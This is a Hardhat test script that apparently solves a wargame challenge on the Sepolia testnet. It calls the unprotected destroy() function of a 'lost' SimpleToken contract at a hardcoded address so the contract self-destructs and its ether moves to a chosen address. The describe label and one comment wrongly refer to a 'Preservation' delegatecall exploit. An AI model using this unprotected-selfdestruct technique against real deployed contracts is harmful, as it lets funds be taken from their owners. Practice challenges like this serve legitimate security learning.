import { expect } from "chai";
import { Recovery, SimpleToken } from "../typechain-types";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { getContractFactory } from "@nomiclabs/hardhat-ethers/types";
import { strict } from "assert";
import { BigNumber, providers } from "ethers";
import { Provider } from "@ethersproject/providers";

describe("Preservation exploit using delegate call fun", function () {
  let contractAddress: string,
    recoveryContract: Recovery,
    simpleTokenContract: SimpleToken,
    attacker: SignerWithAddress,
    balance: BigNumber;

  //Exploit takes place in deployment
  before("Setup for attack on sepolia", async function () {
    // Setup deployment for library contracts
    [attacker] = await ethers.getSigners();

    contractAddress = "0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75";

    let simpleTokenContractAddress: string =
      "0x792F11A76DD0f43CAB641900D359D50b8FfE1d50";

    recoveryContract = await ethers.getContractAt("Recovery", contractAddress);

    simpleTokenContract = await ethers.getContractAt(
      "SimpleToken",
      simpleTokenContractAddress
    );
  });

  it("perform exploit", async function () {
    let oldBalance = await ethers.provider.getBalance(
      "0x09631cd98dcb5bc8abae267edf76056d85e5ed75"
    );

    console.log("The old balance is :", oldBalance);

    // 1. Destroy contract and send funds back to (0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75)
    // check for validity

    let getName = await simpleTokenContract.name();

    console.log("name is ", getName);

    // destroy the lost token and sent it to the instance address
    let destroyTx = await simpleTokenContract.destroy(
      "0x09631cd98dcb5bc8abae267edf76056d85e5ed75"
    );

    await destroyTx.wait();
    // 2 visually check balance of instance address is greater than .001 eth

    balance = await ethers.provider.getBalance(
      "0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75"
    );

    console.log("The new balance is :", balance);
  }).timeout(30000000);

  after("confirm exploit", async function () {
    // check that the new owner of the preservation contract is indeed my address
    expect(balance).to.be.gte(ethers.utils.parseEther(".001"));
  });
});
